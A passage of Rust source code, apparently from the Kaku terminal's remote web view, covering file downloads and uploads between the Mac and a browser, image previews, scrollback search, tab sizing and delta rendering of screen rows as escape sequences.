    fn drop(&mut self) {
        for (_, upload) in self.0.drain() {
            drop(upload.file);
            let _ = std::fs::remove_file(&upload.path);
        }
    }
}

/// Files on their way to the browser, by the page's id.
#[derive(Default)]
struct Downloads(HashMap<u32, Download>);

struct Download {
    file: Box<dyn std::io::Read + Send>,
    size: u64,
    sent: u64,
    acked: u64,
}

const DOWNLOAD_CHUNK: usize = 64 << 10;
/// Unacknowledged raw bytes per file. Small chunks and a shorter window
/// leave room on the shared socket for terminal input during a download.
const DOWNLOAD_WINDOW: u64 = 256 << 10;
const MAX_DOWNLOAD_BYTES: u64 = 50 << 20;
/// Images up to this size go to a hover preview as they are; decoding and
/// scaling them would save little.
const PREVIEW_AS_IS: u64 = 256 << 10;
/// The longest side a preview is scaled to, whatever the page asks.
const PREVIEW_MAX_SIDE: u32 = 2048;

/// A picture for a hover preview: the image scaled to fit `side` pixels,
/// as JPEG, or PNG when it has transparency. macOS saves screenshots with
/// an alpha channel that is opaque throughout; as PNG a 3456x2234 one
/// scaled to 2048 was 2.6 MB, ten round trips over the relay, and 250 KB
/// as JPEG. A small file, one the image
/// decoder does not know, or one that scaling would not shrink goes as it
/// is. A screenshot is several megabytes, seconds over the relay, and the
/// preview shows it a few hundred pixels wide.
fn preview_bytes(path: &std::path::Path, side: u32) -> Result<Vec<u8>, String> {
    use std::io::Read as _;
    let (mut file, _, size) = open_download(path)?;
    let mut bytes = Vec::with_capacity(size as usize);
    file.read_to_end(&mut bytes)
        .map_err(|e| format!("read failed: {e}"))?;
    if bytes.len() as u64 <= PREVIEW_AS_IS {
        return Ok(bytes);
    }
    let Ok(picture) = image::load_from_memory(&bytes) else {
        return Ok(bytes);
    };
    let side = side.clamp(64, PREVIEW_MAX_SIDE);
    let picture = if picture.width() > side || picture.height() > side {
        picture.thumbnail(side, side)
    } else {
        picture
    };
    let mut out = std::io::Cursor::new(Vec::new());
    let transparent = picture.color().has_alpha() && picture.to_rgba8().pixels().any(|p| p.0[3] < 255);
    let encoded = if transparent {
        picture.write_to(&mut out, image::ImageFormat::Png)
    } else {
        // For the text in screenshots, at about a fifth more bytes than 85.
        image::codecs::jpeg::JpegEncoder::new_with_quality(&mut out, 90)
            .encode_image(&picture.to_rgb8())
    };
    let out = out.into_inner();
    Ok(if encoded.is_ok() && out.len() < bytes.len() {
        out
    } else {
        bytes
    })
}

/// Start sending a preview made by `preview_bytes`.
fn start_preview(id: u32, bytes: Vec<u8>, downloads: &mut HashMap<u32, Download>) -> Vec<String> {
    let mut out = Vec::new();
    let size = bytes.len() as u64;
    if let Some(json) = encode(&WebServerMsg::FileStart {
        id,
        name: "preview",
        size,
    }) {
        out.push(json);
    }
    let mut download = Download {
        file: Box::new(std::io::Cursor::new(bytes)),
        size,
        sent: 0,
        acked: 0,
    };
    if !pump_download(id, &mut download, &mut out) {
        downloads.insert(id, download);
    }
    out
}

/// Downloads one session may have open at once, previews included: each
/// keeps a file open until the page acknowledges the last of it, so without
/// a cap a page could run Kaku out of file descriptors.
const MAX_DOWNLOADS: usize = 16;
/// Previews being made at once; each reads and decodes an image on a
/// blocking thread.
const MAX_PREVIEWS: usize = 4;
/// Paths one `PathsExist` may ask about, and the longest one checked.
const MAX_PATH_CHECKS: usize = 8;
const MAX_CHECKED_PATH: usize = 4096;
/// How often one session may write a screen drift report to the log.
const DRIFT_LOG_EVERY: std::time::Duration = std::time::Duration::from_secs(10);

/// Where a path the user clicked points: `~` is the home folder, and a
/// relative path is taken from the pane's working directory.
fn download_path(path: &str, cwd: Option<std::path::PathBuf>) -> Option<std::path::PathBuf> {
    let path = path.trim();
    if path == "~" {
        return Some(config::HOME_DIR.clone());
    }
    if let Some(rest) = path.strip_prefix("~/") {
        return Some(config::HOME_DIR.join(rest));
    }
    let path = std::path::Path::new(path);
    if path.is_absolute() {
        return Some(path.to_path_buf());
    }
    cwd.map(|cwd| cwd.join(path))
}

/// Open a file for the browser; only regular files up to the size cap.
fn open_download(path: &std::path::Path) -> Result<(std::fs::File, String, u64), String> {
    let shown =
        path.display()
            .to_string()
            .replacen(&config::HOME_DIR.display().to_string(), "~", 1);
    let meta = std::fs::metadata(path).map_err(|_| format!("{shown} was not found"))?;
    if meta.is_dir() {
        return Err(format!("{shown} is a folder"));
    }
    if !meta.is_file() {
        return Err(format!("{shown} is not a file"));
    }
    if meta.len() > MAX_DOWNLOAD_BYTES {
        return Err(format!("{shown} is larger than 50 MB"));
    }
    let file = std::fs::File::open(path).map_err(|e| format!("cannot read {shown}: {e}"))?;
    let name = path
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_else(|| "file".into());
    Ok((file, name, meta.len()))
}

/// The next messages for a download: chunks while the window has room,
/// then `FileEnd` once everything was sent. Returns whether it is done.
fn pump_download(id: u32, download: &mut Download, out: &mut Vec<String>) -> bool {
    use base64::Engine as _;
    use std::io::Read as _;
    while download.sent < download.size && download.sent - download.acked < DOWNLOAD_WINDOW {
        let want = DOWNLOAD_CHUNK.min((download.size - download.sent) as usize);
        let mut buf = vec![0u8; want];
        if let Err(e) = download.file.read_exact(&mut buf) {
            if let Some(json) = encode(&WebServerMsg::FileError {
                id,
                detail: &format!("read failed: {e}"),
            }) {
                out.push(json);
            }
            return true;
        }
        download.sent += want as u64;
        let data = base64::engine::general_purpose::STANDARD.encode(&buf);
        if let Some(json) = encode(&WebServerMsg::FileChunk { id, data: &data }) {
            out.push(json);
        }
    }
    if download.sent >= download.size {
        if let Some(json) = encode(&WebServerMsg::FileEnd { id }) {
            out.push(json);
        }
        return true;
    }
    false
}

/// Apply one download message; the messages to send back, or None when the
/// message is not about downloads.
fn handle_download(
    msg: &WebClientMsg,
    downloads: &mut HashMap<u32, Download>,
    cwd: impl FnOnce(Option<usize>) -> Option<std::path::PathBuf>,
) -> Option<Vec<String>> {
    let mut out = Vec::new();
    match msg {
        WebClientMsg::Download {
            id, path, pane_id, ..
        } => {
            // Each one holds an open file until the page acknowledges it.
            if downloads.len() >= MAX_DOWNLOADS {
                if let Some(json) = encode(&WebServerMsg::FileError {
                    id: *id,
                    detail: "Too many downloads at once; wait for one to finish",
                }) {
                    out.push(json);
                }
                return Some(out);
            }
            let opened = download_path(path, cwd(*pane_id))
                .ok_or_else(|| format!("{path}: no working directory to find it from"))
                .and_then(|path| open_download(&path));
            match opened {
                Ok((file, name, size)) => {
                    if let Some(json) = encode(&WebServerMsg::FileStart {
                        id: *id,
                        name: &name,
                        size,
                    }) {
                        out.push(json);
                    }
                    let mut download = Download {
                        file: Box::new(file),
                        size,
                        sent: 0,
                        acked: 0,
                    };
                    if !pump_download(*id, &mut download, &mut out) {
                        downloads.insert(*id, download);
                    }
                }
                Err(detail) => {
                    if let Some(json) = encode(&WebServerMsg::FileError {
                        id: *id,
                        detail: &detail,
                    }) {
                        out.push(json);
                    }
                }
            }
        }
        WebClientMsg::DownloadAck { id, received } => {
            if let Some(download) = downloads.get_mut(id) {
                download.acked = download.acked.max((*received).min(download.sent));
                if pump_download(*id, download, &mut out) {
                    downloads.remove(id);
                }
            }
        }
        WebClientMsg::DownloadCancel { id } => {
            downloads.remove(id);
        }
        _ => return None,
    }
    Some(out)
}

/// The outcome of an upload step that the page should hear about.
struct UploadReply {
    id: u32,
    ok: bool,
    detail: String,
    /// A chunk was written: bytes received so far. The page advances its
    /// bounded send window on this, so progress reflects bytes on the Mac.
    received: Option<u64>,
}

impl UploadReply {
    fn as_msg(&self) -> WebServerMsg<'_> {
        match self.received {
            Some(received) => WebServerMsg::UploadAck {
                id: self.id,
                received,
            },
            None => WebServerMsg::Uploaded {
                id: self.id,
                ok: self.ok,
                detail: &self.detail,
            },
        }
    }
}

fn yes() -> bool {
    true
}

/// The pane an upload's path is pasted into: the one the page named, else
/// the attached one, and none for a file dropped on the desktop view.
fn upload_target(pane_id: Option<usize>, paste: bool, attached: Option<usize>) -> Option<usize> {
    paste.then(|| pane_id.or(attached)).flatten()
}

/// Apply one upload message; a reply only when the upload finished or failed.
fn handle_upload(
    msg: &WebClientMsg,
    uploads: &mut HashMap<u32, Upload>,
    attached: Option<usize>,
) -> Option<UploadReply> {
    let fail = |id: u32, why: String| {
        Some(UploadReply {
            id,
            ok: false,
            detail: why,
            received: None,
        })
    };
    match msg {
        WebClientMsg::UploadCancel { id } => {
            if let Some(upload) = uploads.remove(id) {
                drop(upload.file);
                let _ = std::fs::remove_file(upload.path);
            }
            None
        }
        WebClientMsg::UploadStart {
            id,
            name,
            size,
            transfer,
            pane_id,
            paste,
        } => {
            let target = upload_target(*pane_id, *paste, attached);
            if !transfer.is_empty()
                && (transfer.len() != 32 || !transfer.bytes().all(|b| b.is_ascii_hexdigit()))
            {
                return fail(*id, "invalid transfer".into());
            }
            if !transfer.is_empty() {
                let mut receipts = UPLOAD_RECEIPTS.lock();
                receipts.retain(|_, r| r.at.elapsed() < RECEIPT_TTL);
                if let Some(done) = receipts.get(transfer) {
                    if done.name != *name || done.size != *size || done.pane_id != target {
                        return fail(*id, "transfer does not match the original file".into());
                    }
                    return Some(UploadReply {
                        id: *id,
                        ok: true,
                        detail: done.path.display().to_string(),
                        received: None,
                    });
                }
            }
            if uploads.len() >= 8 || uploads.contains_key(id) {
                return fail(*id, "too many files in progress".into());
            }
            if *size > MAX_UPLOAD_BYTES {
                return fail(*id, "larger than 50 MB".into());
            }
            let home = std::env::var_os("HOME").map(std::path::PathBuf::from)?;
            let dir = home.join("Downloads").join("Kaku");
            if let Err(e) = std::fs::create_dir_all(&dir) {
                return fail(*id, format!("cannot create {}: {e}", dir.display()));
            }
            let path = unused_path(&dir, &safe_file_name(name));
            // Never truncate an existing file if two sessions choose a name
            // together; the losing upload can retry with a fresh name.
            match std::fs::OpenOptions::new()
                .write(true)
                .create_new(true)
                .open(&path)
            {
                Ok(file) => {
                    uploads.insert(
                        *id,
                        Upload {
                            file,
                            path,
                            size: *size,
                            written: 0,
                            pane_id: target,
                            transfer: transfer.clone(),
                            name: name.clone(),
                        },
                    );
                    None
                }
                Err(e) => fail(*id, format!("cannot write {}: {e}", path.display())),
            }
        }
        WebClientMsg::UploadChunk { id, data } => {
            use base64::Engine as _;
            use std::io::Write as _;
            let upload = uploads.get_mut(id)?;
            let bytes = match base64::engine::general_purpose::STANDARD.decode(data) {
                Ok(bytes) => bytes,
                Err(_) => {
                    let gone = uploads.remove(id)?;
                    let _ = std::fs::remove_file(&gone.path);
                    return fail(*id, "bad data".into());
                }
            };
            upload.written += bytes.len() as u64;
            if upload.written > upload.size.max(1) || upload.written > MAX_UPLOAD_BYTES {
                let gone = uploads.remove(id)?;
                let _ = std::fs::remove_file(&gone.path);
                return fail(*id, "more data than announced".into());
            }
            if let Err(e) = upload.file.write_all(&bytes) {
                let gone = uploads.remove(id)?;
                let _ = std::fs::remove_file(&gone.path);
                return fail(*id, format!("write failed: {e}"));
            }
            Some(UploadReply {
                id: *id,
                ok: true,
                detail: String::new(),
                received: Some(upload.written),
            })
        }
        WebClientMsg::UploadEnd { id } => {
            let upload = uploads.remove(id)?;
            drop(upload.file);
            if upload.written != upload.size {
                let _ = std::fs::remove_file(&upload.path);
                return fail(*id, "file was not fully received".into());
            }
            let shown = upload.path.display().to_string();
            if !upload.transfer.is_empty() {
                let mut receipts = UPLOAD_RECEIPTS.lock();
                prune_receipts(&mut receipts);
                receipts.insert(
                    upload.transfer,
                    UploadReceipt {
                        at: std::time::Instant::now(),
                        name: upload.name,
                        size: upload.size,
                        pane_id: upload.pane_id,
                        path: upload.path,
                    },
                );
            }
            // Under the Mac's AI chat the path would land in the hidden
            // shell; the file is still saved.
            if let Some(pane) = upload
                .pane_id
                .filter(|id| !ai_chat_open(*id))
                .and_then(lookup_pane)
            {
                let quoted = quote_uploaded(&shown, config::configuration().quote_dropped_files);
                if let Err(e) = pane.send_paste(&format!("{quoted} ")) {
                    log::debug!("kaku-remote web: pasting an uploaded path failed: {e:#}");
                }
            }
            Some(UploadReply {
                id: *id,
                ok: true,
                detail: shown,
                received: None,
            })
        }
        _ => None,
    }
}

/// One row's text with the cell column of every character, so a match in
/// the text maps back to columns even with wide characters in the row.
struct RowText {
    row: isize,
    text: String,
    cols: Vec<usize>,
    /// The column just past each character, so a wide last character
    /// counts both of its cells.
    ends: Vec<usize>,
}

fn row_text_of(row: isize, line: &wezterm_term::Line) -> RowText {
    let mut text = String::new();
    let mut cols = Vec::new();
    let mut ends = Vec::new();
    for cell in line.visible_cells() {
        for ch in cell.str().chars() {
            for lower in ch.to_lowercase() {
                text.push(lower);
                cols.push(cell.cell_index());
                ends.push(cell.cell_index() + cell.width().max(1));
            }
        }
    }
    RowText {
        row,
        text,
        cols,
        ends,
    }
}

/// The match nearest to `from` in the given direction within `rows` (which
/// are in ascending row order): (row, column, width in cells).
fn find_in_rows(
    rows: &[RowText],
    needle: &str,
    from: Option<(isize, usize)>,
    older: bool,
) -> Option<(isize, usize, usize)> {
    let hit = |r: &RowText, at: usize| {
        let start = r.cols[at];
        let end = r.ends[at + needle.chars().count() - 1];
        (r.row, start, end - start)
    };
    let matches = |r: &RowText| -> Vec<usize> {
        let chars: Vec<char> = r.text.chars().collect();
        let n: Vec<char> = needle.chars().collect();
        (0..chars.len().saturating_sub(n.len().saturating_sub(1)))
            .filter(|&i| chars[i..].starts_with(&n))
            .collect()
    };
    if older {
        for r in rows.iter().rev() {
            if from.is_some_and(|(fr, _)| r.row > fr) {
                continue;
            }
            let found = matches(r);
            let pick = found.into_iter().rev().find(|&i| match from {
                Some((fr, fc)) if fr == r.row => r.cols[i] < fc,
                _ => true,
            });
            if let Some(i) = pick {
                return Some(hit(r, i));
            }
        }
    } else {
        for r in rows {
            if from.is_some_and(|(fr, _)| r.row < fr) {
                continue;
            }
            let found = matches(r);
            let pick = found.into_iter().find(|&i| match from {
                Some((fr, fc)) if fr == r.row => r.cols[i] > fc,
                _ => true,
            });
            if let Some(i) = pick {
                return Some(hit(r, i));
            }
        }
    }
    None
}

/// Search the pane's whole history in chunks from `from` toward `older` or
/// newer lines, stopping at the first match.
fn search_pane(
    pane: &Arc<dyn Pane>,
    query: &str,
    from: Option<(isize, usize)>,
    older: bool,
) -> Option<(isize, usize, usize)> {
    const CHUNK: isize = 500;
    let needle = query.to_lowercase();
    if needle.is_empty() {
        return None;
    }
    let dims = pane.get_dimensions();
    let first = dims.scrollback_top;
    let end = dims.physical_top + dims.viewport_rows as isize;
    let start = from
        .map(|(row, _)| row)
        .unwrap_or(if older { end - 1 } else { first });
    let mut cursor = start;
    loop {
        let range = if older {
            (cursor - CHUNK + 1).max(first)..(cursor + 1).min(end)
        } else {
            cursor.max(first)..(cursor + CHUNK).min(end)
        };
        if range.start >= range.end {
            return None;
        }
        let (top, lines) = pane.get_lines(range.clone());
        let rows: Vec<RowText> = lines
            .iter()
            .enumerate()
            .map(|(i, line)| row_text_of(top + i as isize, line))
            .collect();
        if let Some(hit) = find_in_rows(&rows, &needle, from, older) {
            return Some(hit);
        }
        if older {
            if range.start <= first {
                return None;
            }
            cursor = range.start - 1;
        } else {
            if range.end >= end {
                return None;
            }
            cursor = range.end;
        }
    }
}

fn mark_seen(pane_id: usize, view: &mut View) {
    let now = std::time::Instant::now();
    if view
        .seen_at
        .is_some_and(|at| now.duration_since(at) < Duration::from_secs(1))
    {
        return;
    }
    view.seen_at = Some(now);
    dispatch_tab_action(TabAction::Seen { pane_id });
}

/// What a browser's size claim does to a tab with `visible` panes on screen
/// (a zoomed pane is the only one).
#[derive(Debug, PartialEq)]
enum SplitClaim {
    /// One pane: the tab takes the browser's grid.
    Size,
    /// Split, at the Mac's size already: nothing to do.
    Ignore,
    /// Split while a browser's size still holds it: back to the window.
    GiveBack,
}

fn split_claim(visible: usize, web_sized: bool) -> SplitClaim {
    match (visible > 1, web_sized) {
        (false, _) => SplitClaim::Size,
        (true, false) => SplitClaim::Ignore,
        (true, true) => SplitClaim::GiveBack,
    }
}

/// Size the tab holding `pane_id` to the browser's grid. Runs on the GUI
/// thread, where the window's own resizes happen.
fn claim_tab_size(pane_id: usize, cols: usize, rows: usize) {
    promise::spawn::spawn_into_main_thread(async move {
        claim_tab_size_on_gui_thread(pane_id, cols, rows);
    })
    .detach();
}

/// Apply a browser's grid on the GUI thread, including immediately after
/// a browser-requested zoom changes the pane's share of its tab.
/// Callers must already be running on the GUI thread.
pub fn claim_tab_size_on_gui_thread(pane_id: usize, cols: usize, rows: usize) {
    let Some(mux) = Mux::try_get() else {
        return;
    };
    let Some((_, _, tab_id)) = mux.resolve_pane_id(PaneId::from(pane_id)) else {
        return;
    };
    let Some(tab) = mux.get_tab(tab_id) else {
        return;
    };
    let current = tab.get_size();
    // A split tab keeps the Mac's layout: the browser shows one split at its
    // own size, scaled to fit, and sizes nothing. Growing the tab so that one
    // split filled the page pushed the others out of the Mac window, and
    // every split on either side moved the claim again.
    match split_claim(tab.iter_panes().len(), tab_is_web_sized(tab_id.into())) {
        SplitClaim::Size => {}
        SplitClaim::Ignore => return,
        SplitClaim::GiveBack => {
            release_web_size(tab_id.into());
            dispatch_tab_action(TabAction::Reclaim { pane_id });
            return;
        }
    }
    let (cols, rows) = (cols.min(MAX_COLS), rows.min(MAX_ROWS));
    WEB_SIZED_TABS.lock().insert(tab_id.into());
    if current.cols == cols && current.rows == rows {
        return;
    }
    let cell_width = current.pixel_width / current.cols.max(1);
    let cell_height = current.pixel_height / current.rows.max(1);
    tab.resize(TerminalSize {
        rows,
        cols,
        pixel_width: cell_width * cols,
        pixel_height: cell_height * rows,
        dpi: current.dpi,
    });
}

struct Frame {
    cols: usize,
    rows: usize,
    title: String,
    scrolled: bool,
    local_scroll: bool,
    /// One self-contained string per row: it positions itself and starts
    /// from reset attributes, so any subset of rows can be sent alone.
    lines: Vec<String>,
    /// The same rows as cells, so a row that changed in a few places can
    /// be sent as just those.
    cells: Vec<Vec<RowCell>>,
    wrapped: Vec<bool>,
    /// Cursor position, shape and visibility, applied after the rows.
    cursor: String,
    /// Inline images on these rows (imgcat, kitty, sixel), and their data.
    images: Vec<ImagePlacement>,
    image_data: HashMap<String, Arc<ImageData>>,
    /// Set by `Shown::update` when `images` differ from what the page has.
    images_changed: bool,
    /// Set by `Shown::update` when the page does not have this title or
    /// these wrap flags yet; a page that asked for deltas gets them only then.
    title_changed: bool,
    wrapped_changed: bool,
    /// Likewise for the pane, grid size and scroll state.
    layout_changed: bool,
}

/// Where an image sits, in cells from the top left of the rows sent. It can
/// start above the first row or left of the first column when only part of
/// it is on screen.
#[derive(Serialize, Clone, PartialEq, Debug)]
struct ImagePlacement {
    id: String,
    col: f32,
    row: f32,
    cols: f32,
    rows: f32,
}

/// Images too large to be worth sending stay on the Mac.
const MAX_IMAGE_BYTES: usize = 8 << 20;

/// Each image cell holds the slice of its image it shows, as texture
/// coordinates; from any one cell, the slice size gives the image's size in
/// cells and the offset gives where its top left is.
fn image_placements(lines: &[Line]) -> (Vec<ImagePlacement>, HashMap<String, Arc<ImageData>>) {
    let mut placements: Vec<ImagePlacement> = Vec::new();
    let mut data = HashMap::new();
    let round = |v: f32| (v * 1000.0).round() / 1000.0;
    for (row, line) in lines.iter().enumerate() {
        for cell in line.visible_cells() {
            let Some(images) = cell.attrs().images() else {
                continue;
            };
            for image in images {
                let (tl, br) = (image.top_left(), image.bottom_right());
                let du = *br.x - *tl.x;
                let dv = *br.y - *tl.y;
                if du <= 0.0 || dv <= 0.0 {
                    continue;
                }
                let id: String = image.image_data().hash()[..8]
                    .iter()
                    .map(|b| format!("{b:02x}"))
                    .collect();
                let placement = ImagePlacement {
                    col: round(cell.cell_index() as f32 - *tl.x / du),
                    row: round(row as f32 - *tl.y / dv),
                    cols: round(1.0 / du),
                    rows: round(1.0 / dv),
                    id: id.clone(),
                };
                if !placements.contains(&placement) {
                    placements.push(placement);
                }
                data.entry(id).or_insert_with(|| image.image_data().clone());
            }
        }
    }
    (placements, data)
}

/// The image as a file a browser can show: encoded files as they are, raw
/// pixels as PNG, an animation by its first frame.
fn image_file(image: &ImageData) -> Option<(&'static str, Vec<u8>)> {
    let sniff = |bytes: Vec<u8>| -> Option<(&'static str, Vec<u8>)> {
        let mime = if bytes.starts_with(b"\x89PNG") {
            "image/png"
        } else if bytes.starts_with(&[0xff, 0xd8]) {
            "image/jpeg"
        } else if bytes.starts_with(b"GIF8") {
            "image/gif"
        } else if bytes.len() > 12 && &bytes[..4] == b"RIFF" && &bytes[8..12] == b"WEBP" {
            "image/webp"
        } else {
            return None;
        };
        Some((mime, bytes))
    };
    let png = |width: u32, height: u32, pixels: &[u8]| -> Option<(&'static str, Vec<u8>)> {
        let buffer = image::RgbaImage::from_raw(width, height, pixels.to_vec())?;
        let mut out = std::io::Cursor::new(Vec::new());
        buffer.write_to(&mut out, image::ImageFormat::Png).ok()?;
        Some(("image/png", out.into_inner()))
    };
    let file = match &*image.data() {
        ImageDataType::EncodedFile(bytes) => sniff(bytes.clone()),
        ImageDataType::EncodedLease(lease) => sniff(lease.get_data().ok()?),
        ImageDataType::Rgba8 {
            data,
            width,
            height,
            ..
        } => png(*width, *height, data),
        ImageDataType::AnimRgba8 {
            width,
            height,
            frames,
            ..
        } => png(*width, *height, frames.first()?),
    }?;
    (file.1.len() <= MAX_IMAGE_BYTES).then_some(file)
}

fn render_frame(pane: &Arc<dyn Pane>, view: &mut View) -> Frame {
    let dims = pane.get_dimensions();
    let rows = dims.viewport_rows;
    let live_top = dims.physical_top;

    let top = match view.pinned_top {
        Some(top) if top < live_top => top.max(dims.scrollback_top),
        _ => {
            view.pinned_top = None;
            live_top
        }
    };

    let (_, lines) = pane.get_lines(top..top + rows as isize);

    let (rendered, cells) = screen_rows(&lines, rows, dims.cols, &pane.palette());

    let mut cursor_out = String::new();
    let cursor = pane.get_cursor_position();
    let cursor_row = cursor.y - top;
    if view.pinned_top.is_none() && cursor_row >= 0 && (cursor_row as usize) < rows {
        let _ = write!(
            cursor_out,
            "\x1b[{};{}H\x1b[{} q",
            cursor_row + 1,
            cursor.x + 1,
            cursor_shape_param(cursor.shape)
        );
        if cursor.visibility == CursorVisibility::Visible {
            cursor_out.push_str("\x1b[?25h");
        }
    }

    let (images, image_data) = image_placements(&lines);
    Frame {
        cols: dims.cols,
        rows,
        title: pane.get_title(),
        scrolled: view.pinned_top.is_some(),
        local_scroll: pane_scrolls_locally(pane),
        lines: rendered,
        cells,
        wrapped: (0..rows)
            .map(|row| lines.get(row).is_some_and(Line::last_cell_was_wrapped))
            .collect(),
        cursor: cursor_out,
        images,
        image_data,
        images_changed: false,
        title_changed: false,
        wrapped_changed: false,
        layout_changed: false,
    }
}

/// Each screen row as a self-contained string that places itself, and as
/// cells.
fn screen_rows(
    lines: &[Line],
    rows: usize,
    cols: usize,
    palette: &ColorPalette,
) -> (Vec<String>, Vec<Vec<RowCell>>) {
    let mut rendered = Vec::with_capacity(rows);
    let mut cells = Vec::with_capacity(rows);
    for row in 0..rows {
        let mut out = String::with_capacity(cols + 16);
        let _ = write!(out, "\x1b[{};1H", row + 1);
        let row_cells = lines
            .get(row)
            .map(|line| row_cells(line, cols, palette))
            .unwrap_or_default();
        write_cells(&row_cells, cols, &mut out);
        // Clear the rest of the row with the default background.
        out.push_str("\x1b[0m\x1b[K");
        rendered.push(out);
        cells.push(row_cells);
    }
    (rendered, cells)
}

fn local_scroll_allowed(alt_screen: bool, mouse_grabbed: bool, foreground: Option<&str>) -> bool {
    // Like the native wheel handler, less -X gets arrow keys even though
    // it uses the normal screen rather than the alternate screen.
    !alt_screen && !mouse_grabbed && foreground.and_then(|p| p.rsplit('/').next()) != Some("less")
}

fn pane_scrolls_locally(pane: &Arc<dyn Pane>) -> bool {
    let alt_screen = pane.is_alt_screen_active();
    let mouse_grabbed = pane.is_mouse_grabbed();
    let foreground = if !alt_screen && !mouse_grabbed {
        pane.get_foreground_process_name(mux::pane::CachePolicy::AllowStale)
    } else {
        None
    };
    local_scroll_allowed(alt_screen, mouse_grabbed, foreground.as_deref())
}

/// One row's cells as SGR runs, at most `cols` wide.
fn render_cells(line: &Line, cols: usize, palette: &ColorPalette, out: &mut String) {
    write_cells(&row_cells(line, cols, palette), cols, out);
}

/// One cell as the page gets it: where it starts, how wide Kaku draws it,
/// its attributes and its text (a space for an empty cell).
#[derive(Clone, PartialEq, Debug)]
struct RowCell {
    col: usize,
    width: usize,
    sgr: Sgr,
    text: String,
}

fn row_cells(line: &Line, cols: usize, palette: &ColorPalette) -> Vec<RowCell> {
    let mut cells = Vec::new();
    let mut col = 0;
    for cell in line.visible_cells() {
        if col >= cols {
            break;
        }
        let text = cell.str();
        let width = cell.width().max(1);
        cells.push(RowCell {
            col,
            width,
            sgr: Sgr::from_attrs(cell.attrs(), palette),
            text: if text.is_empty() {
                " ".into()
            } else {
                text.into()
            },
        });
        col += width;
    }
    cells
}

/// Cells as SGR runs. The first cell always states its attributes, since
/// every SGR here starts from a reset, so a run of cells can be written
/// anywhere on its own.
fn write_cells(cells: &[RowCell], cols: usize, out: &mut String) {
    let mut current: Option<&Sgr> = None;
    for cell in cells {
        if current != Some(&cell.sgr) {
            cell.sgr.write(out);
            current = Some(&cell.sgr);
        }
        out.push_str(&cell.text);
        let next = cell.col + cell.width;
        // xterm.js has its own width table (Unicode 6 by default), so for
        // symbols and emoji it can disagree with Kaku about how many columns
        // a glyph takes and shift the rest of the row. Pin the next column
        // to Kaku's answer.
        if !cell.text.is_ascii() && next < cols {
            let _ = write!(out, "\x1b[{}G", next + 1);
        }
    }
}

/// The bytes that turn `old`, already on the page in `row`, into `new`:
/// only the cells from the first difference to the last one, so Claude
/// Code's spinner, which changes one glyph and a few colors ten times a
/// second, sends those instead of the whole row. Cells compare with their
/// columns, so a common head or tail lines up on both rows.
fn row_delta(row: usize, old: &[RowCell], new: &[RowCell], cols: usize) -> Option<String> {
    let head = old.iter().zip(new).take_while(|(a, b)| a == b).count();
    let tail = old[head..]
        .iter()
        .rev()
        .zip(new[head..].iter().rev())
        .take_while(|(a, b)| a == b)
        .count();
    let changed = &new[head..new.len() - tail];
    let start = match (
        changed.first(),
        head.checked_sub(1).and_then(|i| new.get(i)),
    ) {
        (Some(cell), _) => cell.col,
        // Only removed cells between an equal head and tail: their columns
        // cannot line up, so this is not a row Kaku draws. Send it whole.
        (None, _) if tail > 0 => return None,
        (None, Some(last)) => last.col + last.width,
        (None, None) => 0,
    };
    let mut out = String::new();
    let _ = write!(out, "\x1b[{};{}H", row + 1, start + 1);
    write_cells(changed, cols, &mut out);
    if tail == 0 {
        // The row's end changed: clear past it, as a whole row does.
        out.push_str("\x1b[0m\x1b[K");
    }
    Some(out)
}

/// Up to `HISTORY_PAGE` rows of the pane ending before `end` (the bottom of
/// the screen when absent), with the first row's stable index and the
/// oldest row the pane holds.
fn history_rows(
    pane: &Arc<dyn Pane>,
    end: Option<isize>,
) -> (isize, isize, Vec<String>, Vec<bool>) {
    let dims = pane.get_dimensions();
    let bottom = dims.physical_top + dims.viewport_rows as isize;
    let end = end.unwrap_or(bottom).clamp(dims.scrollback_top, bottom);
    let top = (end - HISTORY_PAGE).max(dims.scrollback_top);
    let (_, lines) = pane.get_lines(top..end);
    let palette = pane.palette();
    let rows = lines
        .iter()
        .map(|line| {
            let mut out = String::new();
            render_cells(line, dims.cols, &palette, &mut out);
            out
        })
        .collect();
    let wrapped = lines.iter().map(Line::last_cell_was_wrapped).collect();
    (dims.scrollback_top, top, rows, wrapped)
}

/// What the browser already shows, so the next frame only carries changes.
#[derive(Default)]
struct Shown {
    cols: usize,
    rows: usize,
    title: String,
    scrolled: bool,
    local_scroll: bool,
    lines: Vec<String>,
    cells: Vec<Vec<RowCell>>,
    wrapped: Vec<bool>,
    cursor: String,
    images: Vec<ImagePlacement>,
    /// A frame went out since the page was last reset, so it has this
    /// title and these wrap flags.
    primed: bool,
    /// For drift reports: the last row move sent, and frames since a full one.
    last_move: isize,
    since_full: usize,
    /// The rows each recent frame left on the page, by frame number. While
    /// Claude Code works, frames are always in flight over the relay, and a
    /// check that waited for none to be pending never ran, so drift stayed
    /// on screen until a reload.
    sent: VecDeque<(u64, Vec<String>)>,
    /// For drift reports: what the last few frames did, oldest first.
    recent: VecDeque<String>,
}

/// Frames named in a drift report.
const RECENT_KEPT: usize = 8;

/// Frames that can be in flight, with room for the page's check to travel.
const SENT_KEPT: usize = FRAME_WINDOW * 2;

impl Shown {
    /// Remember what frame `seq` left on the page, for checking it later.
    /// A check compares visible text only, so keep that rather than every
    /// row's styling, which on a tall, colorful screen ran to megabytes
    /// across the frames kept.
    fn sent_as(&mut self, seq: u64) {
        if self.sent.len() == SENT_KEPT {
            self.sent.pop_front();
        }
        self.sent
            .push_back((seq, self.lines.iter().map(|l| row_text(l)).collect()));
    }

    /// The rows frame `seq` left on the page, if it is recent.
    fn rows_after(&self, seq: u64) -> Option<&[String]> {
        self.sent
            .iter()
            .rev()
            .find(|(s, _)| *s == seq)
            .map(|(_, lines)| lines.as_slice())
    }

    /// The bytes that bring the browser from what it shows to `frame`, or
    /// None when nothing changed. The frame's images are left in it only when
    /// they changed.
    fn update(&mut self, mut frame: Frame) -> Option<(Frame, String)> {
        let full = self.cols != frame.cols
            || self.lines.len() != frame.lines.len()
            || self.scrolled != frame.scrolled;
        let mut data = String::from("\x1b[?25l");
        let mut changed = false;
        // Scrolling, and output that pushes rows up, move most of the screen
        // without changing it. Let the browser move what it already has and
        // send only the rows that are new, instead of every row again.
        let moved = if full {
            0
        } else {
            row_shift(&self.lines, &frame.lines)
        };
        if full {
            self.since_full = 0;
        } else {
            self.since_full += 1;
        }
        if moved != 0 {
            self.last_move = moved;
            let _ = write!(
                data,
                "\x1b[0m\x1b[{}{}",
                moved.unsigned_abs(),
